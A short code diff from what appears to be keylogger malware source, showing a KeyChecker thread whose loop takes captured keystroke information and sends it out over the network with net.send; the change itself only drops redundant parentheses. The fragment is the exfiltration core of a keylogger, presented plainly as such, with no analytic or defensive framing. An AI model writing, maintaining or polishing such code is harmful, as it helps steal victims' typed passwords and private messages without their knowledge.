@@ -31,7 +31,7 @@ class KeyChecker(threading.Thread):
 
     def run(self):
         while True:
-            if (self.keylogger.hasInfoToSend()):
+            if self.keylogger.hasInfoToSend():
                 info = self.keylogger.getInfo()
                 net.send(''.join(info))
             time.sleep(0)
